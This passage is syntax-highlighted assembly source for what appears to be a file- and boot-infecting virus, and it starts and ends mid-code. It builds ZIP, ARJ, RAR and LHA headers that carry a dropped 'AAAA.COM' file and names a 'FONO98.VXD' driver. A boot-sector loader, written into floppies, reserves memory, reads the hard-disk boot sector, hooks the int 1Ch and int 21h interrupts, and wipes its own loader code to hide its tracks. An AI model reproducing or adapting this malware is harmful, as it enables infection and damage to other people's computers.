       </span><span class="sc5">ZIPNoDisk</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPNoStartDisk</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPEntryDisk</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPEntrysDir</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPSizeDir</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPOffsetDir</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ZIPCommentLenght</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">      </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ZIPEHeaderId</span><span class="sc0">

       </span><span class="sc5">ARJHeaderId</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ea60h</span><span class="sc0">
       </span><span class="sc5">ARJHeaderSize</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJHeaderCRC</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJ1HeaderSize</span><span class="sc0">
       </span><span class="sc5">ARJ1HEaderSize</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJFilename</span><span class="sc4">-</span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">ARJ1HeaderSize</span><span class="sc0">
       </span><span class="sc5">ARJVersionDone</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc5">ARJVersionNeed</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc5">ARJHostOS</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJFlags</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJMethod</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJType</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJReserved</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJDateTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc5">ARJCompressedSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJUncompressedSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJFileCRC</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJEntryname</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJAccessMode</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc5">ARJHostData</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJFilename</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AAAA.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJComment</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJHeaderCRC</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJExtHeader</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">ARJEnd</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ea60h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">

       </span><span class="sc5">RARHeaderCRC</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">RARHeaderType</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
       </span><span class="sc5">RARFileFlags</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">08000h</span><span class="sc0">
       </span><span class="sc5">RARHeaderSize</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderCRC</span><span class="sc0">
       </span><span class="sc5">RARCompressedSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">RARUncompressedSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">RARHostOS</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">RARFileCRC</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">RARDateTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc5">RARVersionNeed</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc0">
       </span><span class="sc5">RARMethod</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
       </span><span class="sc5">RARFileNameSize</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARHeaderEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">RARFileName</span><span class="sc0">
       </span><span class="sc5">RARFileAttribute</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
       </span><span class="sc5">RARFileName</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AAAA.COM'</span><span class="sc0">
     </span><span class="sc5">RARHeaderEnd</span><span class="sc0">        </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">

       </span><span class="sc5">LHASig</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">LHAHeaderSize</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc5">LHAHeaderCRC</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">LHAMethod</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-lh0-'</span><span class="sc0">
       </span><span class="sc5">LHACompressedSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">LHAUncompressedSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">LHADateTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc5">LHAFlags</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">120h</span><span class="sc0">
       </span><span class="sc5">LHANameLenght</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">LHASizeFilename</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">LHAFilename</span><span class="sc0">
       </span><span class="sc5">LHAFilename</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AAAA.COM'</span><span class="sc0">
     </span><span class="sc5">LHASizeFilename</span><span class="sc0">     </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">
       </span><span class="sc5">LHACRC16</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc5">LHAStuff</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'M'</span><span class="sc0">
       </span><span class="sc5">LHAStuff2</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">LHAHeaderSize</span><span class="sc0">       </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">LHASig</span><span class="sc0">



       </span><span class="sc5">MyVxDName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FONO98.VXD"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">SizeVxDName</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">MyVxDName</span><span class="sc0">

       </span><span class="sc5">FloppyVxD</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IOSUBSYS\HSFLOP.PDR"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">SizeFloppyVxDName</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FloppyVxD</span><span class="sc0">



       </span><span class="sc5">BootLoaderSize</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc5">BootLoaderEnd</span><span class="sc4">-</span><span class="sc5">BootLoader</span><span class="sc0">
     </span><span class="sc5">BootLoader</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;This code is inserted in</span><span class="sc0">
           </span><span class="sc6">cli</span><span class="sc0">                                 </span><span class="sc1">;0/1/15 in 1.44 floppies</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc0">                       </span><span class="sc1">;It is loaded by the</span><span class="sc0">
           </span><span class="sc6">sti</span><span class="sc0">                                 </span><span class="sc1">;polymorphic loader inserted</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">                                 </span><span class="sc1">;in the boot code</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                             </span><span class="sc1">;reserve 1kb and copy ourself</span><span class="sc0">
           </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">                          </span><span class="sc1">;to the reserved hole</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
     </span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">                </span><span class="sc1">;full of bugs and hardcoded</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;references, as you can see :(</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;copy 1kb of code</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hstart</span><span class="sc0">
           </span><span class="sc6">retf</span><span class="sc0">                                </span><span class="sc1">;continue in TOM</span><span class="sc0">
    </span><span class="sc5">hstart</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0180h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                             </span><span class="sc1">;read HDD boot sector</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SM'</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fuck</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1f1h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'IW'</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">fuck</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;initialize int21</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int1c</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old1c</span><span class="sc0">
           </span><span class="sc6">cli</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">stosw</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;hook int1c</span><span class="sc0">
           </span><span class="sc6">stosw</span><span class="sc0">
           </span><span class="sc6">sti</span><span class="sc0">
     </span><span class="sc5">fuck</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">loader</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fuck</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">loader</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;wipe some parts of loader</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">                             </span><span class="sc1">;from memory to reduce</span><span class="sc0">
           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc0">                            </span><span class="sc1">;footprints</span><span class="sc0">
           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Zopy0</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int1c</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int1c</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">e_vxd</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;wipe all virus loader code</span><span class="sc0">
     </span><span class="sc5">no_4b00</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;(less some bytes)</span><span class="sc0">
           </span><span class="sc6">popad</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
           </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
     </span><span class="sc5">int1c</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">pushad</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f9h</span><span class="sc0">                       </span><span class="sc1">;cmp cx, 0</span><span class="sc0">
           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">i1c_check</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">not_yet</span><span class="sc0">                          </span><span class="sc1">;did int21 seg changed?</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i1c_check</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">time_2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">time_2</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;increase number of changes</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_yet</span><span class="sc0">                         </span><span class="sc1">;changed 3 times?</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;copy int21 to int0ff</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;hook int21 to our code</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old1c</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ch</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;restore int1c</span><span class="sc0">
     </span><span class="sc5">not_yet</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">popad</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
     </span><span class="sc5">old1c</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">read_vxd</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">                       </span><span class="sc1">;if the floppy was retired,</span><span class="sc0">
